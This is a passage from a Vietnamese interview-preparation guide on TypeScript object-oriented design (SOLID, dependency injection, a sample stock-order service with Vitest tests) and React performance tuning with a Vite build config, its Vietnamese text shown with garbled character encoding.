  write(data: string): void;
}

interface IDeletable {
  delete(): void;
}

interface ICompressible {
  compress(): void;
}

interface IEncryptable {
  encrypt(key: string): void;
}

// âœ… ReadOnlyFile: chá»‰ implement IReadable
class ReadOnlyFile implements IReadable {
  read(): string {
    return 'ğŸ“„ Äá»c file content...';
  }
  // KHÃ”NG cáº§n implement write/delete/compress/encrypt
}

// âœ… FullAccessFile: implement nhiá»u interfaces tÃ¹y nhu cáº§u
class FullAccessFile implements IReadable, IWritable, IDeletable {
  read(): string {
    return 'ğŸ“„ Äá»c file...';
  }

  write(data: string): void {
    console.log(`âœï¸ Ghi data: ${data}`);
  }

  delete(): void {
    console.log('ğŸ—‘ï¸ XÃ³a file...');
  }
}

// âœ… SecureFile: implement read/write + encrypt
class SecureFile implements IReadable, IWritable, IEncryptable {
  read(): string {
    return 'ğŸ”’ Äá»c encrypted file...';
  }

  write(data: string): void {
    console.log(`ğŸ”’ Ghi encrypted data...`);
  }

  encrypt(key: string): void {
    console.log(`ğŸ” MÃ£ hÃ³a file vá»›i key: ${key}`);
  }
}

// ğŸ¯ Sá»­ dá»¥ng
const readOnly = new ReadOnlyFile();
readOnly.read(); // âœ… OK

const fullAccess = new FullAccessFile();
fullAccess.read();
fullAccess.write('new data');
fullAccess.delete();

const secure = new SecureFile();
secure.read();
secure.write('sensitive data');
secure.encrypt('my-secret-key');

// ğŸ’¡ Lá»£i Ã­ch:
// - Class chá»‰ implement methods cáº§n thiáº¿t
// - TrÃ¡nh "fat interfaces" khÃ³ maintain
// - Dá»… compose: káº¿t há»£p nhiá»u small interfaces
// - Follow Single Responsibility: má»—i interface 1 má»¥c Ä‘Ã­ch

// ğŸ“ D - Dependency Inversion Principle (NguyÃªn táº¯c Äáº£o ngÆ°á»£c Phá»¥ thuá»™c)
// "Phá»¥ thuá»™c vÃ o ABSTRACTIONS (interfaces/abstract classes), KHÃ”NG phá»¥ thuá»™c vÃ o CONCRETIONS (concrete classes)"

// âŒ BAD: Phá»¥ thuá»™c trá»±c tiáº¿p vÃ o concrete classes (tight coupling)
class OrderService {
  private paymentProcessor = new CreditCardPayment('Visa', '1234'); // âŒ Hardcoded
  private logger = new ConsoleLogger(); // âŒ Hardcoded

  async checkout(amount: number): Promise<void> {
    this.logger.log(`Processing order: $${amount}`);
    await this.paymentProcessor.processPayment(amount);
  }

  // ğŸ¤” Váº¥n Ä‘á»:
  // - KhÃ´ng thá»ƒ thay Ä‘á»•i payment method (bá»‹ lock vÃ o CreditCardPayment)
  // - KhÃ´ng thá»ƒ test vá»›i mock logger (bá»‹ lock vÃ o ConsoleLogger)
  // - Tight coupling: OrderService phá»¥ thuá»™c vÃ o concrete implementations
}

// âœ… GOOD: Phá»¥ thuá»™c vÃ o abstractions (interfaces) â†’ Dependency Injection
class OrderService {
  constructor(
    private paymentProcessor: PaymentMethod, // âœ… Abstraction (abstract class)
    private logger: ILogger // âœ… Abstraction (interface)
  ) {
    // âœ… Æ¯u Ä‘iá»ƒm:
    // - Inject báº¥t ká»³ PaymentMethod implementation nÃ o (CreditCard, BankTransfer, Momo...)
    // - Inject báº¥t ká»³ ILogger implementation nÃ o (ConsoleLogger, FileLogger, RemoteLogger...)
    // - Dá»… test: inject mock implementations
  }

  async checkout(amount: number): Promise<void> {
    this.logger.log(`ğŸ›’ Äang xá»­ lÃ½ Ä‘Æ¡n hÃ ng: ${amount}Ä‘`);
    const success = await this.paymentProcessor.processPayment(amount);

    if (success) {
      this.logger.log('âœ… Thanh toÃ¡n thÃ nh cÃ´ng!');
    } else {
      this.logger.log('âŒ Thanh toÃ¡n tháº¥t báº¡i!');
    }
  }
}

// ğŸ¯ Production: DÃ¹ng real implementations
const productionOrderService = new OrderService(
  new CreditCardPayment('Mastercard', '5678'),
  new ConsoleLogger()
);

// ğŸ§ª Testing: DÃ¹ng mock implementations
class MockPaymentMethod extends PaymentMethod {
  async processPayment(amount: number): Promise<boolean> {
    console.log(`[MOCK] Processing ${amount}`);
    return true; // Always success for testing
  }
  validateAmount(amount: number): boolean {
    return true;
  }
}

class MockLogger implements ILogger {
  logs: string[] = [];
  log(message: string): void {
    this.logs.push(message); // Capture logs Ä‘á»ƒ verify
  }
}

const mockLogger = new MockLogger();
const testOrderService = new OrderService(new MockPaymentMethod(), mockLogger);

await testOrderService.checkout(100_000);
console.log(mockLogger.logs); // ['ğŸ›’ Äang xá»­ lÃ½ Ä‘Æ¡n hÃ ng: 100000Ä‘', 'âœ… Thanh toÃ¡n thÃ nh cÃ´ng!']

// ğŸŒ Different environments: Dá»… dÃ ng swap implementations
class FileLogger implements ILogger {
  log(message: string): void {
    // Ghi vÃ o file thay vÃ¬ console
    console.log(`[FILE] ${message}`);
  }
}

const fileLoggerOrderService = new OrderService(
  new BankTransferPayment('VietcomBank', '970436'),
  new FileLogger() // âœ… Thay logger mÃ  khÃ´ng sá»­a OrderService!
);

// ğŸ’¡ Lá»£i Ã­ch:
// - Loose coupling: OrderService khÃ´ng phá»¥ thuá»™c concrete classes
// - Flexible: dá»… swap implementations (dev/staging/production)
// - Testable: inject mocks cho unit tests
// - Follow SOLID: Single Responsibility + Open/Closed + Dependency Inversion

// ============================================
// 6. VÃ Dá»¤ THá»°C Táº¾: Há»† THá»NG TRADING (Giao dá»‹ch Chá»©ng khoÃ¡n)
// ============================================
// ğŸ¯ Ãp dá»¥ng Táº¤T Cáº¢ SOLID principles + Composition + Dependency Injection

// ğŸ“‹ 1. Äá»‹nh nghÄ©a Interfaces (Contracts)
interface IOrderValidator {
  validate(order: Order): boolean; // Validate lá»‡nh giao dá»‹ch
}

interface IOrderExecutor {
  execute(order: Order): Promise<void>; // Thá»±c thi lá»‡nh
}

interface IRiskManager {
  checkRisk(order: Order): boolean; // Kiá»ƒm tra rá»§i ro
}

// ğŸ“¦ 2. Entity: Order (Lá»‡nh giao dá»‹ch)
class Order {
  constructor(
    public symbol: string, // MÃ£ CK: 'AAPL', 'VNM', 'HPG'...
    public quantity: number, // Sá»‘ lÆ°á»£ng: 100, 500...
    public price: number, // GiÃ¡: 150, 75.5...
    public side: 'BUY' | 'SELL' // Mua/BÃ¡n
  ) {}

  // Helper method: tÃ­nh giÃ¡ trá»‹ lá»‡nh
  getValue(): number {
    return this.quantity * this.price;
  }
}

// ğŸ” 3. OrderValidator: Validate lá»‡nh (Single Responsibility)
class OrderValidator implements IOrderValidator {
  validate(order: Order): boolean {
    // Kiá»ƒm tra sá»‘ lÆ°á»£ng vÃ  giÃ¡ há»£p lá»‡
    if (order.quantity <= 0) {
      console.log('âŒ Sá»‘ lÆ°á»£ng pháº£i > 0');
      return false;
    }

    if (order.price <= 0) {
      console.log('âŒ GiÃ¡ pháº£i > 0');
      return false;
    }

    if (!order.symbol || order.symbol.trim() === '') {
      console.log('âŒ MÃ£ CK khÃ´ng há»£p lá»‡');
      return false;
    }

    console.log('âœ… Lá»‡nh há»£p lá»‡');
    return true;
  }
}

// âš ï¸ 4. RiskManager: Kiá»ƒm tra rá»§i ro (Single Responsibility)
class RiskManager implements IRiskManager {
  constructor(
    private maxOrderValue: number // GiÃ¡ trá»‹ lá»‡nh tá»‘i Ä‘a (VD: 100 triá»‡u)
  ) {}

  checkRisk(order: Order): boolean {
    const orderValue = order.getValue();

    if (orderValue > this.maxOrderValue) {
      console.log(
        `âš ï¸ VÆ°á»£t háº¡n má»©c! GiÃ¡ trá»‹ lá»‡nh: ${orderValue}Ä‘ > Háº¡n má»©c: ${this.maxOrderValue}Ä‘`
      );
      return false;
    }

    console.log(`âœ… Trong háº¡n má»©c. GiÃ¡ trá»‹ lá»‡nh: ${orderValue}Ä‘`);
    return true;
  }
}

// ğŸš€ 5. OrderExecutor: Thá»±c thi lá»‡nh (Single Responsibility)
class OrderExecutor implements IOrderExecutor {
  async execute(order: Order): Promise<void> {
    console.log(
      `ğŸš€ Äang gá»­i lá»‡nh ${order.side} ${order.quantity} ${order.symbol} @ ${order.price}Ä‘...`
    );

    // Call Exchange API (HOSE, HNX, NASDAQ...)
    await this.callExchangeAPI(order);

    console.log('âœ… Lá»‡nh Ä‘Ã£ Ä‘Æ°á»£c gá»­i Ä‘áº¿n sÃ n');
  }

  private async callExchangeAPI(order: Order): Promise<void> {
    // Simulate API call
    await new Promise((resolve) => setTimeout(resolve, 100));
    // Real: await axios.post('/api/orders', order);
  }
}

// ğŸ¯ 6. TradingService: Orchestrate (Ä‘iá»u phá»‘i) táº¥t cáº£ services
// âœ… Dependency Inversion: phá»¥ thuá»™c vÃ o interfaces, khÃ´ng pháº£i concrete classes
class TradingService {
  constructor(
    private validator: IOrderValidator, // âœ… Interface
    private riskManager: IRiskManager, // âœ… Interface
    private executor: IOrderExecutor, // âœ… Interface
    private logger: ILogger // âœ… Interface
  ) {
    // ğŸ’‰ Dependency Injection: inject táº¥t cáº£ dependencies qua constructor
  }

  async placeOrder(order: Order): Promise<void> {
    this.logger.log(
      `ğŸ“ Äáº·t lá»‡nh: ${order.side} ${order.quantity} ${order.symbol}`
    );

    // 1ï¸âƒ£ Validate lá»‡nh
    if (!this.validator.validate(order)) {
      throw new Error('Lá»‡nh khÃ´ng há»£p lá»‡!');
    }

    // 2ï¸âƒ£ Kiá»ƒm tra rá»§i ro
    if (!this.riskManager.checkRisk(order)) {
      throw new Error('VÆ°á»£t háº¡n má»©c rá»§i ro!');
    }

    // 3ï¸âƒ£ Thá»±c thi lá»‡nh
    await this.executor.execute(order);

    this.logger.log(`âœ… Äáº·t lá»‡nh thÃ nh cÃ´ng: ${order.symbol}`);
  }
}

// ğŸ”§ 7. Wire up dependencies (Dependency Injection Container)
const tradingService = new TradingService(
  new OrderValidator(), // Inject validator
  new RiskManager(100_000_000), // Inject risk manager (háº¡n má»©c 100 triá»‡u)
  new OrderExecutor(), // Inject executor
  new ConsoleLogger() // Inject logger
);

// ğŸ¯ 8. Sá»­ dá»¥ng
const buyOrder = new Order('AAPL', 100, 150, 'BUY');
await tradingService.placeOrder(buyOrder);

const sellOrder = new Order('VNM', 500, 75.5, 'SELL');
await tradingService.placeOrder(sellOrder);

// âŒ Lá»‡nh khÃ´ng há»£p lá»‡
try {
  const invalidOrder = new Order('HPG', -10, 50, 'BUY'); // Sá»‘ lÆ°á»£ng Ã¢m
  await tradingService.placeOrder(invalidOrder);
} catch (error) {
  console.log(error.message); // 'Lá»‡nh khÃ´ng há»£p lá»‡!'
}

// âŒ VÆ°á»£t háº¡n má»©c
try {
  const bigOrder = new Order('AAPL', 1_000_000, 200, 'BUY'); // 200 triá»‡u > 100 triá»‡u
  await tradingService.placeOrder(bigOrder);
} catch (error) {
  console.log(error.message); // 'VÆ°á»£t háº¡n má»©c rá»§i ro!'
}

// ğŸ’¡ Lá»£i Ã­ch cá»§a architecture nÃ y:
// âœ… Single Responsibility: má»—i class 1 nhiá»‡m vá»¥
// âœ… Open/Closed: thÃªm validator/risk rule má»›i mÃ  khÃ´ng sá»­a code cÅ©
// âœ… Liskov Substitution: thay OrderValidator báº±ng AdvancedOrderValidator
// âœ… Interface Segregation: interfaces nhá», focused
// âœ… Dependency Inversion: TradingService phá»¥ thuá»™c interfaces
// âœ… Testable: dá»… inject mocks cho unit tests
// âœ… Maintainable: dá»… hiá»ƒu, dá»… sá»­a, dá»… extend

// ============================================
// 7. TESTING vá»›i Vitest (Dá»… mock nhá» Composition + DI)
// ============================================
import { describe, it, expect, vi } from 'vitest';

describe('TradingService', () => {
  it('âœ… should place order when valid (khi lá»‡nh há»£p lá»‡)', async () => {
    // ğŸ§ª Táº¡o mocks cho táº¥t cáº£ dependencies
    const mockValidator = {
      validate: vi.fn(() => true), // Mock return true (lá»‡nh há»£p lá»‡)
    };
    const mockRiskManager = {
      checkRisk: vi.fn(() => true), // Mock return true (trong háº¡n má»©c)
    };
    const mockExecutor = {
      execute: vi.fn(), // Mock execute (khÃ´ng thá»±c thi tháº­t)
    };
    const mockLogger = {
      log: vi.fn(), // Mock log (capture logs)
    };

    // ğŸ’‰ Inject mocks vÃ o TradingService
    const service = new TradingService(
      mockValidator,
      mockRiskManager,
      mockExecutor,
      mockLogger
    );

    // ğŸ¯ Test action: Ä‘áº·t lá»‡nh
    const order = new Order('AAPL', 100, 150, 'BUY');
    await service.placeOrder(order);

    // âœ… Verify: cÃ¡c methods Ä‘Ã£ Ä‘Æ°á»£c gá»i vá»›i Ä‘Ãºng params
    expect(mockValidator.validate).toHaveBeenCalledWith(order);
    expect(mockValidator.validate).toHaveBeenCalledTimes(1);

    expect(mockRiskManager.checkRisk).toHaveBeenCalledWith(order);
    expect(mockRiskManager.checkRisk).toHaveBeenCalledTimes(1);

    expect(mockExecutor.execute).toHaveBeenCalledWith(order);
    expect(mockExecutor.execute).toHaveBeenCalledTimes(1);

    expect(mockLogger.log).toHaveBeenCalledTimes(2); // log 2 láº§n (báº¯t Ä‘áº§u + káº¿t thÃºc)
  });

  it('âŒ should throw error when validation fails (khi validate fail)', async () => {
    // ğŸ§ª Mock validator return false
    const mockValidator = {
      validate: vi.fn(() => false), // âŒ Lá»‡nh khÃ´ng há»£p lá»‡
    };
    const mockRiskManager = { checkRisk: vi.fn() };
    const mockExecutor = { execute: vi.fn() };
    const mockLogger = { log: vi.fn() };

    const service = new TradingService(
      mockValidator,
      mockRiskManager,
      mockExecutor,
      mockLogger
    );

    const order = new Order('AAPL', -10, 150, 'BUY'); // Sá»‘ lÆ°á»£ng Ã¢m

    // âœ… Expect throw error
    await expect(service.placeOrder(order)).rejects.toThrow(
      'Lá»‡nh khÃ´ng há»£p lá»‡!'
    );

    // âœ… Verify: executor KHÃ”NG Ä‘Æ°á»£c gá»i (vÃ¬ validate fail)
    expect(mockExecutor.execute).not.toHaveBeenCalled();
  });

  it('âŒ should throw error when risk check fails (khi vÆ°á»£t háº¡n má»©c)', async () => {
    // ğŸ§ª Mock risk manager return false
    const mockValidator = { validate: vi.fn(() => true) };
    const mockRiskManager = {
      checkRisk: vi.fn(() => false), // âŒ VÆ°á»£t háº¡n má»©c
    };
    const mockExecutor = { execute: vi.fn() };
    const mockLogger = { log: vi.fn() };

    const service = new TradingService(
      mockValidator,
      mockRiskManager,
      mockExecutor,
      mockLogger
    );

    const order = new Order('AAPL', 1_000_000, 200, 'BUY'); // Lá»‡nh quÃ¡ lá»›n

    // âœ… Expect throw error
    await expect(service.placeOrder(order)).rejects.toThrow(
      'VÆ°á»£t háº¡n má»©c rá»§i ro!'
    );

    // âœ… Verify: executor KHÃ”NG Ä‘Æ°á»£c gá»i (vÃ¬ risk check fail)
    expect(mockExecutor.execute).not.toHaveBeenCalled();
  });

  it('ğŸ“Š should log correct messages (kiá»ƒm tra logs)', async () => {
    const mockValidator = { validate: vi.fn(() => true) };
    const mockRiskManager = { checkRisk: vi.fn(() => true) };
    const mockExecutor = { execute: vi.fn() };
    const mockLogger = { log: vi.fn() };

    const service = new TradingService(
      mockValidator,
      mockRiskManager,
      mockExecutor,
      mockLogger
    );

    const order = new Order('VNM', 500, 75.5, 'SELL');
    await service.placeOrder(order);

    // âœ… Verify logs
    expect(mockLogger.log).toHaveBeenCalledWith('ğŸ“ Äáº·t lá»‡nh: SELL 500 VNM');
    expect(mockLogger.log).toHaveBeenCalledWith('âœ… Äáº·t lá»‡nh thÃ nh cÃ´ng: VNM');
  });
});

// ğŸ’¡ Lá»£i Ã­ch cá»§a testing vá»›i Composition + DI:
// âœ… Dá»… mock: inject mock dependencies thay vÃ¬ real implementations
// âœ… Isolated tests: test tá»«ng unit riÃªng biá»‡t, khÃ´ng phá»¥ thuá»™c external services
// âœ… Fast: khÃ´ng call API tháº­t, khÃ´ng database tháº­t
// âœ… Predictable: mock return cá»‘ Ä‘á»‹nh â†’ tests deterministic
// âœ… Coverage: dá»… test edge cases (validation fail, risk fail, errors...)
```

---

**Best Practices:**

1. **Prefer Composition Over Inheritance**

   ```typescript
   // âŒ BAD: Inheritance
   class UserService extends Logger {}

   // âœ… GOOD: Composition
   class UserService {
     constructor(private logger: Logger) {}
   }
   ```

2. **Use Private Fields `#` cho Encapsulation**

   ```typescript
   class User {
     #password: string; // Truly private

     // âŒ NOT this._password (convention only)
   }
   ```

3. **Dependency Injection cho Testability**

   ```typescript
   // âœ… GOOD: Inject dependencies
   class Service {
     constructor(private db: IDatabase, private logger: ILogger) {}
   }
   ```

4. **Abstract Classes cho Shared Logic**

   ```typescript
   abstract class BaseRepository<T> {
     abstract tableName: string;

     // Shared method
     async findById(id: string): Promise<T | null> {
       // Common query logic
     }
   }
   ```

5. **Interfaces cho Contract**

   ```typescript
   interface IPaymentGateway {
     charge(amount: number): Promise<boolean>;
     refund(transactionId: string): Promise<void>;
   }
   ```

6. **Single Responsibility Principle**

   ```typescript
   // âœ… One class = one job
   class UserValidator {
     validate() {}
   }
   class UserRepository {
     save() {}
   }
   class UserService {
     register() {}
   }
   ```

7. **Readonly Properties cho Immutability**
   ```typescript
   class Order {
     constructor(public readonly id: string, public readonly createdAt: Date) {}
   }
   ```

---

**Common Mistakes:**

1. **âŒ Deep Inheritance Hierarchies**

   ```typescript
   // TOO DEEP!
   class A {}
   class B extends A {}
   class C extends B {}
   class D extends C {} // Hard to maintain

   // âœ… Use composition instead
   ```

2. **âŒ Exposing Internal State**

   ```typescript
   class User {
     public password: string; // âŒ Exposed!

     // âœ… Use private field + getter
     #password: string;
     setPassword(pwd: string) {
       this.#password = hashPassword(pwd);
     }
   }
   ```

3. **âŒ God Classes (Too Many Responsibilities)**

   ```typescript
   class UserManager {
     validateUser() {}
     saveUser() {}
     sendEmail() {}
     logActivity() {}
     // âŒ Too many jobs! Split into separate classes
   }
   ```

4. **âŒ Tight Coupling vá»›i Concrete Classes**

   ```typescript
   class Service {
     private logger = new ConsoleLogger(); // âŒ Hardcoded

     // âœ… Inject abstraction
     constructor(private logger: ILogger) {}
   }
   ```

5. **âŒ KhÃ´ng Override `constructor` Correctly**

   ```typescript
   class Child extends Parent {
     constructor(name: string) {
       this.name = name; // âŒ Must call super() first!
       super();
     }

     // âœ… Correct order
     constructor(name: string) {
       super();
       this.name = name;
     }
   }
   ```

6. **âŒ Overriding Private Methods**

   ```typescript
   class Parent {
     #privateMethod() {} // Cannot override in child
   }

   // âœ… Use protected in TypeScript
   class Parent {
     protected method() {} // Can override
   }
   ```

7. **âŒ KhÃ´ng Validate trong Constructor**

   ```typescript
   class User {
     constructor(email: string) {
       this.email = email; // âŒ No validation
     }

     // âœ… Validate immediately
     constructor(email: string) {
       if (!email.includes('@')) throw new Error('Invalid email');
       this.email = email;
     }
   }
   ```

---
</details>


## **Pháº§n 16: Senior-Level Questions (CÃ¢u Há»i Cáº¥p Senior)**

<details>
<summary><span style="font-size:1.25em;font-weight:bold;">ğŸš€ Q50: Tá»‘i Æ¯u Performance cá»§a React Web App</span></summary>


**â“ TÃ¬nh Huá»‘ng:**

Báº¡n lÃ  Senior Frontend Developer cá»§a má»™t Trading Platform (React + TypeScript). App hiá»‡n táº¡i cÃ³ cÃ¡c váº¥n Ä‘á»:

- **Initial Load**: 5-7s trÃªn 3G, bundle size 2.5MB
- **Runtime Performance**:
  - Real-time updates (WebSocket) gÃ¢y re-render toÃ n bá»™ app (60+ components)
  - List 10,000+ orders lag khi scroll (FPS drop 60 â†’ 15)
  - Memory leak sau 2-3 giá» sá»­ dá»¥ng (memory tÄƒng tá»« 50MB â†’ 500MB)
- **User Complaints**: App cháº­m, lag, sometimes crash

**YÃªu cáº§u:** Thiáº¿t káº¿ vÃ  implement chiáº¿n lÆ°á»£c tá»‘i Æ°u toÃ n diá»‡n (tá»« build-time Ä‘áº¿n runtime).

**âœ… ÄÃ¡p Ãn Chi Tiáº¿t:**

**ğŸ¯ Chiáº¿n LÆ°á»£c Tá»‘i Æ¯u 5 Táº§ng (5-Layer Optimization Strategy):**

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚           PERFORMANCE OPTIMIZATION LAYERS                     â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                               â”‚
â”‚  1ï¸âƒ£ BUILD-TIME OPTIMIZATION (Tá»‘i Æ°u lÃºc build)              â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚  â”‚ â€¢ Bundle Size Reduction (Giáº£m kÃ­ch thÆ°á»›c bundle)        â”‚ â”‚
â”‚  â”‚ â€¢ Code Splitting (Chia nhá» code)                        â”‚ â”‚
â”‚  â”‚ â€¢ Tree-shaking (Loáº¡i bá» dead code)                      â”‚ â”‚
â”‚  â”‚ â€¢ Lazy Loading (Táº£i code khi cáº§n)                       â”‚ â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â”‚                                                               â”‚
â”‚  2ï¸âƒ£ NETWORK OPTIMIZATION (Tá»‘i Æ°u máº¡ng)                      â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚  â”‚ â€¢ Resource Hints (Prefetch, Preload, Preconnect)       â”‚ â”‚
â”‚  â”‚ â€¢ HTTP/2 + Compression (Gzip, Brotli)                  â”‚ â”‚
â”‚  â”‚ â€¢ CDN + Edge Caching                                    â”‚ â”‚
â”‚  â”‚ â€¢ Service Worker + Offline Cache                       â”‚ â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â”‚                                                               â”‚
â”‚  3ï¸âƒ£ RENDERING OPTIMIZATION (Tá»‘i Æ°u render)                  â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚  â”‚ â€¢ React.memo + useMemo + useCallback                   â”‚ â”‚
â”‚  â”‚ â€¢ Virtual Scrolling (10K+ items)                        â”‚ â”‚
â”‚  â”‚ â€¢ Debounce + Throttle                                   â”‚ â”‚
â”‚  â”‚ â€¢ Lazy Image Loading + Responsive Images               â”‚ â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â”‚                                                               â”‚
â”‚  4ï¸âƒ£ STATE MANAGEMENT OPTIMIZATION (Tá»‘i Æ°u state)            â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚  â”‚ â€¢ Context Splitting (TÃ¡ch context nhá»)                  â”‚ â”‚
â”‚  â”‚ â€¢ Zustand/Redux Toolkit (Selective subscriptions)      â”‚ â”‚
â”‚  â”‚ â€¢ Immer (Immutable updates hiá»‡u quáº£)                    â”‚ â”‚
â”‚  â”‚ â€¢ React Query (Server state caching)                   â”‚ â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â”‚                                                               â”‚
â”‚  5ï¸âƒ£ MEMORY MANAGEMENT (Tá»‘i Æ°u bá»™ nhá»›)                       â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚  â”‚ â€¢ Cleanup useEffect (Listeners, timers, subscriptions) â”‚ â”‚
â”‚  â”‚ â€¢ AbortController (Cancel requests)                     â”‚ â”‚
â”‚  â”‚ â€¢ WeakMap/WeakSet (Temporary references)               â”‚ â”‚
â”‚  â”‚ â€¢ Memory Profiling (Chrome DevTools)                   â”‚ â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

**Hoáº¡t Ä‘á»™ng:**

**ğŸ“Š Performance Metrics Target (Má»¥c tiÃªu):**

- Initial Load: 5-7s â†’ **< 2s** (70% improvement)
- Bundle Size: 2.5MB â†’ **< 500KB** (80% reduction)
- FPS: 15 â†’ **60 FPS** (4x improvement)
- Memory: 500MB â†’ **< 100MB** (80% reduction)

---

**Code Example (TypeScript + React):**

```typescript
// ============================================
// 1ï¸âƒ£ BUILD-TIME OPTIMIZATION (Tá»I Æ¯U LÃšC BUILD)
// ============================================

// ğŸ“¦ A. Cáº¥u HÃ¬nh Vite (CÃ´ng cá»¥ build hiá»‡n Ä‘áº¡i - nhanh hÆ¡n Webpack)
// File: vite.config.ts
import { defineConfig } from 'vite';
import react from '@vitejs/plugin-react';
import { visualizer } from 'rollup-plugin-visualizer';

export default defineConfig({
  plugins: [
    react(), // Plugin há»— trá»£ React (Fast Refresh, JSX transform)
    visualizer({ open: true }), // Plugin phÃ¢n tÃ­ch bundle size (má»Ÿ browser sau build)
  ],

  build: {
    // âœ… Code Splitting: Chia nhá» bundle thÃ nh nhiá»u file
    // LÃ½ do: Browser chá»‰ táº£i file cáº§n thiáº¿t â†’ giáº£m Initial Load time
    rollupOptions: {
      output: {
        manualChunks: {
          // TÃ¡ch React libraries riÃªng (Ã­t thay Ä‘á»•i â†’ cache browser tá»‘t)
          // Khi update app code, React vendor váº«n dÃ¹ng cache cÅ©
          'react-vendor': ['react', 'react-dom', 'react-router-dom'],

          // TÃ¡ch chart libraries (ráº¥t náº·ng - 500KB+)
          // Chá»‰ load khi user vÃ o trang cÃ³ chart
          'chart-vendor': ['recharts', 'lightweight-charts'],

          // TÃ¡ch utilities thÃ nh bundle riÃªng
          utils: ['lodash-es', 'date-fns', 'axios'],
        },
      },
    },

    // âœ… Minify: NÃ©n code (xÃ³a whitespace, rÃºt ngáº¯n tÃªn biáº¿n)
    // Terser: Tool minify máº¡nh nháº¥t hiá»‡n táº¡i
    minify: 'terser',
    terserOptions: {
      compress: {
        drop_console: true, // XÃ³a táº¥t cáº£ console.log trong production
        drop_debugger: true, // XÃ³a debugger statements
      },
    },

    // âœ… Source Maps: 'hidden' = cÃ³ source maps nhÆ°ng khÃ´ng expose
    // LÃ½ do: Debug Ä‘Æ°á»£c lá»—i production nhÆ°ng khÃ´ng lá»™ source code
    sourcemap: 'hidden',

    // âœ… Cáº£nh bÃ¡o náº¿u chunk > 500KB (quÃ¡ lá»›n â†’ load cháº­m)
    chunkSizeWarningLimit: 500,
  },

